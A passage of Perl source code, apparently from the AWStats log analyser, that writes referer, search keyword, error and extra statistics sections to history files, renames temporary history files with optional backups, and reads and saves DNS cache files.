\"${xmlbe}\\n\";\n\t\tforeach ( keys %_screensize_h ) {\n\t\t\tprint HISTORYTMP \"${xmlrb}$_${xmlrs}$_screensize_h{$_}${xmlre}\\n\";\n\t\t}\n\t\tprint HISTORYTMP \"${xmleb}END_SCREENSIZE${xmlee}\\n\";\n\t}\n\n\t# Referer\n\tif ( $sectiontosave eq 'unknownreferer' ) {\n\t\tprint HISTORYTMP \"\\n\";\n\t\tif ($xml) {\n\t\t\tprint HISTORYTMP \"<section id='$sectiontosave'><comment>\\n\";\n\t\t}\n\t\tprint HISTORYTMP \"# Unknown referer OS - Last visit date\\n\";\n\t\t$ValueInFile{$sectiontosave} = tell HISTORYTMP;\n\t\tprint HISTORYTMP \"${xmlbb}BEGIN_UNKNOWNREFERER${xmlbs}\"\n\t\t  . ( scalar keys %_unknownreferer_l )\n\t\t  . \"${xmlbe}\\n\";\n\t\tforeach ( keys %_unknownreferer_l ) {\n\t\t\tprint HISTORYTMP \"${xmlrb}\"\n\t\t\t  . XMLEncodeForHisto($_)\n\t\t\t  . \"${xmlrs}$_unknownreferer_l{$_}${xmlre}\\n\";\n\t\t}\n\t\tprint HISTORYTMP \"${xmleb}END_UNKNOWNREFERER${xmlee}\\n\";\n\t}\n\tif ( $sectiontosave eq 'unknownrefererbrowser' ) {\n\t\tprint HISTORYTMP \"\\n\";\n\t\tif ($xml) {\n\t\t\tprint HISTORYTMP \"<section id='$sectiontosave'><comment>\\n\";\n\t\t}\n\t\tprint HISTORYTMP \"# Unknown referer Browser - Last visit date\\n\";\n\t\t$ValueInFile{$sectiontosave} = tell HISTORYTMP;\n\t\tprint HISTORYTMP \"${xmlbb}BEGIN_UNKNOWNREFERERBROWSER${xmlbs}\"\n\t\t  . ( scalar keys %_unknownrefererbrowser_l )\n\t\t  . \"${xmlbe}\\n\";\n\t\tforeach ( keys %_unknownrefererbrowser_l ) {\n\t\t\tprint HISTORYTMP \"${xmlrb}\"\n\t\t\t  . XMLEncodeForHisto($_)\n\t\t\t  . \"${xmlrs}$_unknownrefererbrowser_l{$_}${xmlre}\\n\";\n\t\t}\n\t\tprint HISTORYTMP \"${xmleb}END_UNKNOWNREFERERBROWSER${xmlee}\\n\";\n\t}\n\tif ( $sectiontosave eq 'origin' ) {\n\t\tprint HISTORYTMP \"\\n\";\n\t\tif ($xml) {\n\t\t\tprint HISTORYTMP \"<section id='$sectiontosave'><comment>\\n\";\n\t\t}\n\t\tprint HISTORYTMP \"# Origin - Pages - Hits \\n\";\n\t\t$ValueInFile{$sectiontosave} = tell HISTORYTMP;\n\t\tprint HISTORYTMP \"${xmlbb}BEGIN_ORIGIN${xmlbs}6\" . \"${xmlbe}\\n\";\n\t\tprint HISTORYTMP \"${xmlrb}From0${xmlrs}\"\n\t\t  . int( $_from_p[0] )\n\t\t  . \"${xmlrs}\"\n\t\t  . int( $_from_h[0] )\n\t\t  . \"${xmlre}\\n\";\n\t\tprint HISTORYTMP \"${xmlrb}From1${xmlrs}\"\n\t\t  . int( $_from_p[1] )\n\t\t  . \"${xmlrs}\"\n\t\t  . int( $_from_h[1] )\n\t\t  . \"${xmlre}\\n\";\n\t\tprint HISTORYTMP \"${xmlrb}From2${xmlrs}\"\n\t\t  . int( $_from_p[2] )\n\t\t  . \"${xmlrs}\"\n\t\t  . int( $_from_h[2] )\n\t\t  . \"${xmlre}\\n\";\n\t\tprint HISTORYTMP \"${xmlrb}From3${xmlrs}\"\n\t\t  . int( $_from_p[3] )\n\t\t  . \"${xmlrs}\"\n\t\t  . int( $_from_h[3] )\n\t\t  . \"${xmlre}\\n\";\n\t\tprint HISTORYTMP \"${xmlrb}From4${xmlrs}\"\n\t\t  . int( $_from_p[4] )\n\t\t  . \"${xmlrs}\"\n\t\t  . int( $_from_h[4] )\n\t\t  . \"${xmlre}\\n\";    # Same site\n\t\tprint HISTORYTMP \"${xmlrb}From5${xmlrs}\"\n\t\t  . int( $_from_p[5] )\n\t\t  . \"${xmlrs}\"\n\t\t  . int( $_from_h[5] )\n\t\t  . \"${xmlre}\\n\";    # News\n\t\tprint HISTORYTMP \"${xmleb}END_ORIGIN${xmlee}\\n\";\n\t}\n\tif ( $sectiontosave eq 'sereferrals' ) {\n\t\tprint HISTORYTMP \"\\n\";\n\t\tif ($xml) {\n\t\t\tprint HISTORYTMP \"<section id='$sectiontosave'><comment>\\n\";\n\t\t}\n\t\tprint HISTORYTMP \"# Search engine referers ID - Pages - Hits\\n\";\n\t\t$ValueInFile{$sectiontosave} = tell HISTORYTMP;\n\t\tprint HISTORYTMP \"${xmlbb}BEGIN_SEREFERRALS${xmlbs}\"\n\t\t  . ( scalar keys %_se_referrals_h )\n\t\t  . \"${xmlbe}\\n\";\n\t\tforeach ( keys %_se_referrals_h ) {\n\t\t\tprint HISTORYTMP \"${xmlrb}$_${xmlrs}\"\n\t\t\t  . int( $_se_referrals_p{$_} || 0 )\n\t\t\t  . \"${xmlrs}$_se_referrals_h{$_}${xmlre}\\n\";\n\t\t}\n\t\tprint HISTORYTMP \"${xmleb}END_SEREFERRALS${xmlee}\\n\";\n\t}\n\tif ( $sectiontosave eq 'pagerefs' ) {\n\t\tprint HISTORYTMP \"\\n\";\n\t\tif ($xml) {\n\t\t\tprint HISTORYTMP\n\"<section id='$sectiontosave'><sortfor>$MaxNbOf{'RefererShown'}</sortfor><comment>\\n\";\n\t\t}\n\t\tprint HISTORYTMP \"# External page referers - Pages - Hits\\n\";\n\t\tprint HISTORYTMP\n\"# The $MaxNbOf{'RefererShown'} first Pages must be first (order not required for others)\\n\";\n\t\t$ValueInFile{$sectiontosave} = tell HISTORYTMP;\n\t\tprint HISTORYTMP \"${xmlbb}BEGIN_PAGEREFS${xmlbs}\"\n\t\t  . ( scalar keys %_pagesrefs_h )\n\t\t  . \"${xmlbe}\\n\";\n\n# We save page list in score sorted order to get a -output faster and with less use of memory.\n\t\t&BuildKeyList(\n\t\t\t$MaxNbOf{'RefererShown'}, $MinHit{'Refer'},\n\t\t\t\\%_pagesrefs_h,           \\%_pagesrefs_p\n\t\t);\n\t\t%keysinkeylist = ();\n\t\tforeach (@keylist) {\n\t\t\t$keysinkeylist{$_} = 1;\n\t\t\tmy $newkey = $_;\n\t\t\t$newkey =~ s/^http(s|):\\/\\/([^\\/]+)\\/$/http$1:\\/\\/$2/i\n\t\t\t  ; # Remove / at end of http://.../ but not at end of http://.../dir/\n\t\t\tprint HISTORYTMP \"${xmlrb}\"\n\t\t\t  . XMLEncodeForHisto($newkey)\n\t\t\t  . \"${xmlrs}\"\n\t\t\t  . int( $_pagesrefs_p{$_} || 0 )\n\t\t\t  . \"${xmlrs}$_pagesrefs_h{$_}${xmlre}\\n\";\n\t\t}\n\t\tforeach ( keys %_pagesrefs_h ) {\n\t\t\tif ( $keysinkeylist{$_} ) { next; }\n\t\t\tmy $newkey = $_;\n\t\t\t$newkey =~ s/^http(s|):\\/\\/([^\\/]+)\\/$/http$1:\\/\\/$2/i\n\t\t\t  ; # Remove / at end of http://.../ but not at end of http://.../dir/\n\t\t\tprint HISTORYTMP \"${xmlrb}\"\n\t\t\t  . XMLEncodeForHisto($newkey)\n\t\t\t  . \"${xmlrs}\"\n\t\t\t  . int( $_pagesrefs_p{$_} || 0 )\n\t\t\t  . \"${xmlrs}$_pagesrefs_h{$_}${xmlre}\\n\";\n\t\t}\n\t\tprint HISTORYTMP \"${xmleb}END_PAGEREFS${xmlee}\\n\";\n\t}\n\tif ( $sectiontosave eq 'searchwords' ) {\n\n\t\t# Save phrases section\n\t\tprint HISTORYTMP \"\\n\";\n\t\tif ($xml) {\n\t\t\tprint HISTORYTMP\n\"<section id='$sectiontosave'><sortfor>$MaxNbOf{'KeyphrasesShown'}</sortfor><comment>\\n\";\n\t\t}\n\t\tprint HISTORYTMP \"# Search keyphrases - Number of search\\n\";\n\t\tprint HISTORYTMP\n\"# The $MaxNbOf{'KeyphrasesShown'} first number of search must be first (order not required for others)\\n\";\n\t\t$ValueInFile{$sectiontosave} = tell HISTORYTMP;\n\t\tprint HISTORYTMP \"${xmlbb}BEGIN_SEARCHWORDS${xmlbs}\"\n\t\t  . ( scalar keys %_keyphrases )\n\t\t  . \"${xmlbe}\\n\";\n\n\t\t# We will also build _keywords\n\t\t%_keywords = ();\n\n# We save key list in score sorted order to get a -output faster and with less use of memory.\n\t\t&BuildKeyList( $MaxNbOf{'KeywordsShown'},\n\t\t\t$MinHit{'Keyword'}, \\%_keyphrases, \\%_keyphrases );\n\t\t%keysinkeylist = ();\n\t\tforeach my $key (@keylist) {\n\t\t\t$keysinkeylist{$key} = 1;\n\t\t\tmy $keyphrase = $key;\n\t\t\t$keyphrase =~ tr/ /\\+/s;\n\t\t\tprint HISTORYTMP \"${xmlrb}\"\n\t\t\t  . XMLEncodeForHisto($keyphrase)\n\t\t\t  . \"${xmlrs}\"\n\t\t\t  . $_keyphrases{$key}\n\t\t\t  . \"${xmlre}\\n\";\n\t\t\tforeach ( split( /\\+/, $key ) ) {\n\t\t\t\t$_keywords{$_} += $_keyphrases{$key};\n\t\t\t}    # To init %_keywords\n\t\t}\n\t\tforeach my $key ( keys %_keyphrases ) {\n\t\t\tif ( $keysinkeylist{$key} ) { next; }\n\t\t\tmy $keyphrase = $key;\n\t\t\t$keyphrase =~ tr/ /\\+/s;\n\t\t\tprint HISTORYTMP \"${xmlrb}\"\n\t\t\t  . XMLEncodeForHisto($keyphrase)\n\t\t\t  . \"${xmlrs}\"\n\t\t\t  . $_keyphrases{$key}\n\t\t\t  . \"${xmlre}\\n\";\n\t\t\tforeach ( split( /\\+/, $key ) ) {\n\t\t\t\t$_keywords{$_} += $_keyphrases{$key};\n\t\t\t}    # To init %_keywords\n\t\t}\n\t\tprint HISTORYTMP \"${xmleb}END_SEARCHWORDS${xmlee}\\n\";\n\n\t\t# Now save keywords section\n\t\tprint HISTORYTMP \"\\n\";\n\t\tif ($xml) {\n\t\t\tprint HISTORYTMP\n\"<section id='keywords'><sortfor>$MaxNbOf{'KeywordsShown'}</sortfor><comment>\\n\";\n\t\t}\n\t\tprint HISTORYTMP \"# Search keywords - Number of search\\n\";\n\t\tprint HISTORYTMP\n\"# The $MaxNbOf{'KeywordsShown'} first number of search must be first (order not required for others)\\n\";\n\t\t$ValueInFile{\"keywords\"} = tell HISTORYTMP;\n\t\tprint HISTORYTMP \"${xmlbb}BEGIN_KEYWORDS${xmlbs}\"\n\t\t  . ( scalar keys %_keywords )\n\t\t  . \"${xmlbe}\\n\";\n\n# We save key list in score sorted order to get a -output faster and with less use of memory.\n\t\t&BuildKeyList( $MaxNbOf{'KeywordsShown'},\n\t\t\t$MinHit{'Keyword'}, \\%_keywords, \\%_keywords );\n\t\t%keysinkeylist = ();\n\t\tforeach (@keylist) {\n\t\t\t$keysinkeylist{$_} = 1;\n\t\t\tmy $keyword = $_;\n\t\t\tprint HISTORYTMP \"${xmlrb}\"\n\t\t\t  . XMLEncodeForHisto($keyword)\n\t\t\t  . \"${xmlrs}\"\n\t\t\t  . $_keywords{$_}\n\t\t\t  . \"${xmlre}\\n\";\n\t\t}\n\t\tforeach ( keys %_keywords ) {\n\t\t\tif ( $keysinkeylist{$_} ) { next; }\n\t\t\tmy $keyword = $_;\n\t\t\tprint HISTORYTMP \"${xmlrb}\"\n\t\t\t  . XMLEncodeForHisto($keyword)\n\t\t\t  . \"${xmlrs}\"\n\t\t\t  . $_keywords{$_}\n\t\t\t  . \"${xmlre}\\n\";\n\t\t}\n\t\tprint HISTORYTMP \"${xmleb}END_KEYWORDS${xmlee}\\n\";\n\n\t}\n\n\t# Other - Errors\n\tif ( $sectiontosave eq 'cluster' ) {\n\t\tprint HISTORYTMP \"\\n\";\n\t\tif ($xml) {\n\t\t\tprint HISTORYTMP \"<section id='$sectiontosave'><comment>\\n\";\n\t\t}\n\t\tprint HISTORYTMP \"# Cluster ID - Pages - Hits - Bandwidth\\n\";\n\t\t$ValueInFile{$sectiontosave} = tell HISTORYTMP;\n\t\tprint HISTORYTMP \"${xmlbb}BEGIN_CLUSTER${xmlbs}\"\n\t\t  . ( scalar keys %_cluster_h )\n\t\t  . \"${xmlbe}\\n\";\n\t\tforeach ( keys %_cluster_h ) {\n\t\t\tprint HISTORYTMP \"${xmlrb}$_${xmlrs}\"\n\t\t\t  . int( $_cluster_p{$_} || 0 )\n\t\t\t  . \"${xmlrs}\"\n\t\t\t  . int( $_cluster_h{$_} || 0 )\n\t\t\t  . \"${xmlrs}\"\n\t\t\t  . int( $_cluster_k{$_} || 0 )\n\t\t\t  . \"${xmlre}\\n\";\n\t\t}\n\t\tprint HISTORYTMP \"${xmleb}END_CLUSTER${xmlee}\\n\";\n\t}\n\tif ( $sectiontosave eq 'misc' ) {\n\t\tprint HISTORYTMP \"\\n\";\n\t\tif ($xml) {\n\t\t\tprint HISTORYTMP \"<section id='$sectiontosave'><comment>\\n\";\n\t\t}\n\t\tprint HISTORYTMP \"# Misc ID - Pages - Hits - Bandwidth\\n\";\n\t\t$ValueInFile{$sectiontosave} = tell HISTORYTMP;\n\t\tprint HISTORYTMP \"${xmlbb}BEGIN_MISC${xmlbs}\"\n\t\t  . ( scalar keys %MiscListCalc )\n\t\t  . \"${xmlbe}\\n\";\n\t\tforeach ( keys %MiscListCalc ) {\n\t\t\tprint HISTORYTMP \"${xmlrb}$_${xmlrs}\"\n\t\t\t  . int( $_misc_p{$_} || 0 )\n\t\t\t  . \"${xmlrs}\"\n\t\t\t  . int( $_misc_h{$_} || 0 )\n\t\t\t  . \"${xmlrs}\"\n\t\t\t  . int( $_misc_k{$_} || 0 )\n\t\t\t  . \"${xmlre}\\n\";\n\t\t}\n\t\tprint HISTORYTMP \"${xmleb}END_MISC${xmlee}\\n\";\n\t}\n\tif ( $sectiontosave eq 'errors' ) {\n\t\tprint HISTORYTMP \"\\n\";\n\t\tif ($xml) {\n\t\t\tprint HISTORYTMP \"<section id='$sectiontosave'><comment>\\n\";\n\t\t}\n\t\tprint HISTORYTMP \"# Errors - Hits - Bandwidth\\n\";\n\t\t$ValueInFile{$sectiontosave} = tell HISTORYTMP;\n\t\tprint HISTORYTMP \"${xmlbb}BEGIN_ERRORS${xmlbs}\"\n\t\t  . ( scalar keys %_errors_h )\n\t\t  . \"${xmlbe}\\n\";\n\t\tforeach ( keys %_errors_h ) {\n\t\t\tprint HISTORYTMP \"${xmlrb}$_${xmlrs}$_errors_h{$_}${xmlrs}\"\n\t\t\t  . int( $_errors_k{$_} || 0 )\n\t\t\t  . \"${xmlre}\\n\";\n\t\t}\n\t\tprint HISTORYTMP \"${xmleb}END_ERRORS${xmlee}\\n\";\n\t}\n\n\t# Other - Trapped errors\n\tforeach my $code ( keys %TrapInfosForHTTPErrorCodes ) {\n\t\tif ( $sectiontosave eq \"sider_$code\" ) {\n\t\t\tprint HISTORYTMP \"\\n\";\n\t\t\tif ($xml) {\n\t\t\t\tprint HISTORYTMP \"<section id='$sectiontosave'><comment>\\n\";\n\t\t\t}\n\t\t\tprint HISTORYTMP\n\t\t\t  \"# URL with $code errors - Hits\"\n\t\t\t  . ($ShowHTTPErrorsPageDetail =~ /R/i ? \" - Last URL referrer\" : '')\n\t\t\t  . ($ShowHTTPErrorsPageDetail =~ /H/i ? \" - Host\" : '')\n\t\t\t  . \"\\n\";\n\n\t\t\t$ValueInFile{$sectiontosave} = tell HISTORYTMP;\n\t\t\tprint HISTORYTMP \"${xmlbb}BEGIN_SIDER_$code${xmlbs}\"\n\t\t\t  . ( scalar keys %{$_sider_h{$code}} )\n\t\t\t  . \"${xmlbe}\\n\";\n\t\t\tforeach ( keys %{$_sider_h{$code}} ) {\n\t\t\t\tmy $newkey = $_;\n\t\t\t\tmy $newreferer = $_referer_h{$code}{$_} || '';\n\t\t\t\tmy $newhost = $_err_host_h{$code}{$_} || '';\n\t\t\t\tprint HISTORYTMP \"${xmlrb}\"\n\t\t\t\t  . XMLEncodeForHisto($newkey)\n\t\t\t\t  . \"${xmlrs}$_sider_h{ $code }{$_}\"\n\t\t\t\t  . ($ShowHTTPErrorsPageDetail =~ /R/i ? \"${xmlrs}\" . XMLEncodeForHisto($newreferer) : '')\n\t\t\t\t  . ($ShowHTTPErrorsPageDetail =~ /H/i ? \"${xmlrs}\" . XMLEncodeForHisto($newhost) : '')\n\t\t\t\t  . \"${xmlre}\\n\";\n\t\t\t}\n\t\t\tprint HISTORYTMP \"${xmleb}END_SIDER_$code${xmlee}\\n\";\n\t\t}\n\t}\n\n\t# Other - Extra stats sections\n\tforeach my $extranum ( 1 .. @ExtraName - 1 ) {\n\t\tif ( $sectiontosave eq \"extra_$extranum\" ) {\n\t\t\tprint HISTORYTMP \"\\n\";\n\t\t\tif ($xml) {\n\t\t\t\tprint HISTORYTMP\n\"<section id='$sectiontosave'><sortfor>$MaxNbOfExtra[$extranum]</sortfor><comment>\\n\";\n\t\t\t}\n\t\t\tprint HISTORYTMP\n\t\t\t  \"# Extra key - Pages - Hits - Bandwidth - Last access\\n\";\n\t\t\tprint HISTORYTMP\n\t\t\t  \"# The $MaxNbOfExtra[$extranum] first number of hits are first\\n\";\n\t\t\t$ValueInFile{$sectiontosave} = tell HISTORYTMP;\n\t\t\tprint HISTORYTMP \"${xmlbb}BEGIN_EXTRA_$extranum${xmlbs}\"\n\t\t\t  . scalar( keys %{ '_section_' . $extranum . '_h' } )\n\t\t\t  . \"${xmlbe}\\n\";\n\t\t\t&BuildKeyList(\n\t\t\t\t$MaxNbOfExtra[$extranum],\n\t\t\t\t$MinHitExtra[$extranum],\n\t\t\t\t\\%{ '_section_' . $extranum . '_h' },\n\t\t\t\t\\%{ '_section_' . $extranum . '_p' }\n\t\t\t);\n\t\t\t%keysinkeylist = ();\n\t\t\tforeach (@keylist) {\n\t\t\t\t$keysinkeylist{$_} = 1;\n\t\t\t\tmy $page       = ${ '_section_' . $extranum . '_p' }{$_} || 0;\n\t\t\t\tmy $bytes      = ${ '_section_' . $extranum . '_k' }{$_} || 0;\n\t\t\t\tmy $lastaccess = ${ '_section_' . $extranum . '_l' }{$_} || '';\n\t\t\t\tprint HISTORYTMP \"${xmlrb}\"\n\t\t\t\t  . XMLEncodeForHisto($_)\n\t\t\t\t  . \"${xmlrs}$page${xmlrs}\",\n\t\t\t\t  ${ '_section_' . $extranum . '_h' }{$_},\n\t\t\t\t  \"${xmlrs}$bytes${xmlrs}$lastaccess${xmlre}\\n\";\n\t\t\t\tnext;\n\t\t\t}\n\t\t\tforeach ( keys %{ '_section_' . $extranum . '_h' } ) {\n\t\t\t\tif ( $keysinkeylist{$_} ) { next; }\n\t\t\t\tmy $page       = ${ '_section_' . $extranum . '_p' }{$_} || 0;\n\t\t\t\tmy $bytes      = ${ '_section_' . $extranum . '_k' }{$_} || 0;\n\t\t\t\tmy $lastaccess = ${ '_section_' . $extranum . '_l' }{$_} || '';\n\t\t\t\tprint HISTORYTMP \"${xmlrb}\"\n\t\t\t\t  . XMLEncodeForHisto($_)\n\t\t\t\t  . \"${xmlrs}$page${xmlrs}\",\n\t\t\t\t  ${ '_section_' . $extranum . '_h' }{$_},\n\t\t\t\t  \"${xmlrs}$bytes${xmlrs}$lastaccess${xmlre}\\n\";\n\t\t\t\tnext;\n\t\t\t}\n\t\t\tprint HISTORYTMP \"${xmleb}END_EXTRA_$extranum${xmlee}\\n\";\n\t\t}\n\t}\n\n\t# Other - Plugin sections\n\tif ( $AtLeastOneSectionPlugin && $sectiontosave =~ /^plugin_(\\w+)$/i ) {\n\t\tmy $pluginname = $1;\n\t\tif ( $PluginsLoaded{'SectionInitHashArray'}{\"$pluginname\"} ) {\n\n#   \t\tmy $function=\"SectionWriteHistory_$pluginname(\\$xml,\\$xmlbb,\\$xmlbs,\\$xmlbe,\\$xmlrb,\\$xmlrs,\\$xmlre,\\$xmleb,\\$xmlee)\";\n#  \t\t    eval(\"$function\");\n\t\t\tmy $function = \"SectionWriteHistory_$pluginname\";\n\t\t\t&$function(\n\t\t\t\t$xml,   $xmlbb, $xmlbs, $xmlbe, $xmlrb,\n\t\t\t\t$xmlrs, $xmlre, $xmleb, $xmlee\n\t\t\t);\n\t\t}\n\t}\n\n\t%keysinkeylist = ();\n}\n\n#--------------------------------------------------------------------\n# Function:     Rename all tmp history file into history\n# Parameters:   None\n# Input:        $DirData $PROG $FileSuffix\n#               $KeepBackupOfHistoricFile $SaveDatabaseFilesWithPermissionsForEveryone\n# Output:       None\n# Return:       1 Ok, 0 at least one error (tmp files are removed)\n#--------------------------------------------------------------------\nsub Rename_All_Tmp_History {\n\tmy $pid      = $$;\n\tmy $renameok = 1;\n\n\tif ($Debug) {\n\t\tdebug(\"Call to Rename_All_Tmp_History (FileSuffix=$FileSuffix)\");\n\t}\n\n\topendir( DIR, \"$DirData\" );\n\n\tmy $datemask;\n\tif    ( $DatabaseBreak eq 'month' ) { $datemask = '\\d\\d\\d\\d\\d\\d'; }\n\telsif ( $DatabaseBreak eq 'year' )  { $datemask = '\\d\\d\\d\\d'; }\n\telsif ( $DatabaseBreak eq 'day' )   { $datemask = '\\d\\d\\d\\d\\d\\d\\d\\d'; }\n\telsif ( $DatabaseBreak eq 'hour' )  { $datemask = '\\d\\d\\d\\d\\d\\d\\d\\d\\d\\d'; }\n\tif ($Debug) {\n\t\tdebug(\n\"Scan for temp history files to rename into DirData='$DirData' with mask='$datemask'\"\n\t\t);\n\t}\n\n\tmy $regfilesuffix = quotemeta($FileSuffix);\n\tforeach ( grep /^$PROG($datemask)$regfilesuffix\\.tmp\\.$pid$/,\n\t\tfile_filt sort readdir DIR )\n\t{\n\t\t/^$PROG($datemask)$regfilesuffix\\.tmp\\.$pid$/;\n\t\tif ($renameok) {    # No rename error yet\n\t\t\tif ($Debug) {\n\t\t\t\tdebug(\n\" Rename new tmp history file $PROG$1$FileSuffix.tmp.$$ into $PROG$1$FileSuffix.txt\",\n\t\t\t\t\t1\n\t\t\t\t);\n\t\t\t}\n\t\t\tif ( -s \"$DirData/$PROG$1$FileSuffix.tmp.$$\" )\n\t\t\t{               # Rename tmp files if size > 0\n\t\t\t\tif ($KeepBackupOfHistoricFiles) {\n\t\t\t\t\tif ( -s \"$DirData/$PROG$1$FileSuffix.txt\" )\n\t\t\t\t\t{       # History file already exists. We backup it\n\t\t\t\t\t\tif ($Debug) {\n\t\t\t\t\t\t\tdebug(\n\"  Make a backup of old history file into $PROG$1$FileSuffix.bak before\",\n\t\t\t\t\t\t\t\t1\n\t\t\t\t\t\t\t);\n\t\t\t\t\t\t}\n\n#if (FileCopy(\"$DirData/$PROG$1$FileSuffix.txt\",\"$DirData/$PROG$1$FileSuffix.bak\")) {\n\t\t\t\t\t\tif (\n\t\t\t\t\t\t\trename(\n\t\t\t\t\t\t\t\t\"$DirData/$PROG$1$FileSuffix.txt\",\n\t\t\t\t\t\t\t\t\"$DirData/$PROG$1$FileSuffix.bak\"\n\t\t\t\t\t\t\t) == 0\n\t\t\t\t\t\t  )\n\t\t\t\t\t\t{\n\t\t\t\t\t\t\twarning(\n\"Warning: Failed to make a backup of \\\"$DirData/$PROG$1$FileSuffix.txt\\\" into \\\"$DirData/$PROG$1$FileSuffix.bak\\\".\"\n\t\t\t\t\t\t\t);\n\t\t\t\t\t\t}\n\t\t\t\t\t\tif ($SaveDatabaseFilesWithPermissionsForEveryone) {\n\t\t\t\t\t\t\tchmod 0666, \"$DirData/$PROG$1$FileSuffix.bak\";\n\t\t\t\t\t\t}\n\t\t\t\t\t}\n\t\t\t\t\telse {\n\t\t\t\t\t\tif ($Debug) {\n\t\t\t\t\t\t\tdebug( \"  No need to backup old history file\", 1 );\n\t\t\t\t\t\t}\n\t\t\t\t\t}\n\t\t\t\t}\n\t\t\t\tif (\n\t\t\t\t\trename(\n\t\t\t\t\t\t\"$DirData/$PROG$1$FileSuffix.tmp.$$\",\n\t\t\t\t\t\t\"$DirData/$PROG$1$FileSuffix.txt\"\n\t\t\t\t\t) == 0\n\t\t\t\t  )\n\t\t\t\t{\n\t\t\t\t\t$renameok =\n\t\t\t\t\t  0;    # At least one error in renaming working files\n\t\t\t\t\t        # Remove tmp file\n\t\t\t\t\tunlink \"$DirData/$PROG$1$FileSuffix.tmp.$$\";\n\t\t\t\t\twarning(\n\"Warning: Failed to rename \\\"$DirData/$PROG$1$FileSuffix.tmp.$$\\\" into \\\"$DirData/$PROG$1$FileSuffix.txt\\\".\\nWrite permissions on \\\"$PROG$1$FileSuffix.txt\\\" might be wrong\"\n\t\t\t\t\t\t  . (\n\t\t\t\t\t\t\t$ENV{'GATEWAY_INTERFACE'}\n\t\t\t\t\t\t\t? \" for an 'update from web'\"\n\t\t\t\t\t\t\t: \"\"\n\t\t\t\t\t\t  )\n\t\t\t\t\t\t  . \" or file might be opened.\"\n\t\t\t\t\t);\n\t\t\t\t\tnext;\n\t\t\t\t}\n\t\t\t\tif ($SaveDatabaseFilesWithPermissionsForEveryone) {\n\t\t\t\t\tchmod 0666, \"$DirData/$PROG$1$FileSuffix.txt\";\n\t\t\t\t}\n\t\t\t}\n\t\t}\n\t\telse {    # Because of rename error, we remove all remaining tmp files\n\t\t\tunlink \"$DirData/$PROG$1$FileSuffix.tmp.$$\";\n\t\t}\n\t}\n\tclose DIR;\n\treturn $renameok;\n}\n\n#------------------------------------------------------------------------------\n# Function:     Load DNS cache file entries into a memory hash array\n# Parameters:\tHash array ref to load into,\n#               File name to load,\n#\t\t\t\tFile suffix to use\n#               Save to a second plugin file if not up to date\n# Input:\t\tNone\n# Output:\t\tHash array is loaded\n# Return:\t\t1 No DNS Cache file found, 0 OK\n#------------------------------------------------------------------------------\nsub Read_DNS_Cache {\n\tmy $hashtoload   = shift;\n\tmy $dnscachefile = shift;\n\tmy $filesuffix   = shift;\n\tmy $savetohash   = shift;\n\n\tmy $dnscacheext = '';\n\tmy $filetoload  = '';\n\tmy $timetoload  = time();\n\n\tif ($Debug) { debug(\"Call to Read_DNS_Cache [file=\\\"$dnscachefile\\\"]\"); }\n\tif ( $dnscachefile =~ s/(\\.\\w+)$// ) { $dnscacheext = $1; }\n\tforeach my $dir ( \"$DirData\", \".\", \"\" ) {\n\t\tmy $searchdir = $dir;\n\t\tif (   $searchdir\n\t\t\t&& ( !( $searchdir =~ /\\/$/ ) )\n\t\t\t&& ( !( $searchdir =~ /\\\\$/ ) ) )\n\t\t{\n\t\t\t$searchdir .= \"/\";\n\t\t}\n\t\tif ( -f \"${searchdir}$dnscachefile$filesuffix$dnscacheext\" ) {\n\t\t\t$filetoload = \"${searchdir}$dnscachefile$filesuffix$dnscacheext\";\n\t\t}\n\n\t\t# Plugin call : Change filetoload\n\t\tif ( $PluginsLoaded{'SearchFile'}{'hashfiles'} ) {\n\t\t\tSearchFile_hashfiles(\n\t\t\t\t$searchdir,   $dnscachefile, $filesuffix,\n\t\t\t\t$dnscacheext, $filetoload\n\t\t\t);\n\t\t}\n\t\tif ($filetoload) { last; }    # We found a file to load\n\t}\n\n\tif ( !$filetoload ) {\n\t\tif ($Debug) { debug(\" No DNS Cache file found\"); }\n\t\treturn 1;\n\t}\n\n\t# Plugin call : Load hashtoload\n\tif ( $PluginsLoaded{'LoadCache'}{'hashfiles'} ) {\n\t\tLoadCache_hashfiles( $filetoload, $hashtoload );\n\t}\n\tif ( !scalar keys %$hashtoload ) {\n\t\topen( DNSFILE, \"$filetoload\" )\n\t\t  or error(\"Couldn't open DNS Cache file \\\"$filetoload\\\": $!\");\n\n#binmode DNSFILE;\t\t# If we set binmode here, it seems that the load is broken on ActiveState 5.8\n# This is a fast way to load with regexp\n\t\t%$hashtoload =\n\t\t  map( /^(?:\\d{0,10}\\s+)?([0-9A-F:\\.]+)\\s+([^\\s]+)$/oi, <DNSFILE> );\n\t\tclose DNSFILE;\n\t\tif ($savetohash) {\n\n\t# Plugin call : Save hash file (all records) with test if up to date to save\n\t\t\tif ( $PluginsLoaded{'SaveHash'}{'hashfiles'} ) {\n\t\t\t\tSaveHash_hashfiles( $filetoload, $hashtoload, 1, 0 );\n\t\t\t}\n\t\t}\n\t}\n\tif ($Debug) {\n\t\tdebug(\n\t\t\t\" Loaded \"\n\t\t\t  . ( scalar keys %$hashtoload )\n\t\t\t  . \" items from $filetoload in \"\n\t\t\t  . ( time() - $timetoload )\n\t\t\t  . \" seconds.\",\n\t\t\t1\n\t\t);\n\t}\n\treturn 0;\n}\n\n#------------------------------------------------------------------------------\n# Function:     Save a memory hash array into a DNS cache file\n# Parameters:\tHash array ref to save,\n#               File name to save,\n#\t\t\t\tFile suffix to use\n# Input:\t\tNone\n# Output:\t\tNone\n# Return:\t\t0 OK, 1 Error\n#------------------------------------------------------------------------------\nsub Save_DNS_Cache_File {\n\tmy $hashtosave   = shift;\n\tmy $dnscachefile = shift;\n\tmy $filesuffix   = shift;\n\n\tmy $dnscacheext    = '';\n\tmy $filetosave     = '';\n\tmy $timetosave     = time();\n\tmy $nbofelemtosave = $NBOFLASTUPDATELOOKUPTOSAVE;\n\tmy $nbofelemsaved  = 0;\n\n\tif ($Debug) {\n\t\tdebug(\"Call to Save_DNS_Cache_File [file=\\\"$dnscachefile\\\"]\");\n\t}\n\tif ( !scalar keys %$hashtosave ) {\n\t\tif ($Debug) { debug(\" No data to save\"); }\n\t\treturn 0;\n\t}\n\tif ( $dnscachefile =~ s/(\\.\\w+)$// ) { $dnscacheext = $1; }\n\t$filetosave = \"$dnscachefile$filesuffix$dnscacheext\";\n\n# Plugin call : Save hash file (only $NBOFLASTUPDATELOOKUPTOSAVE records) with no test if up to date\n\tif ( $PluginsLoaded{'SaveHash'}{'hashfiles'} ) {\n\t\tSaveHash_hashfiles( $filetosave, $hashtosave, 0, $nbofelemtosave,\n\t\t\t$nbofelemsaved );\n\t\tif 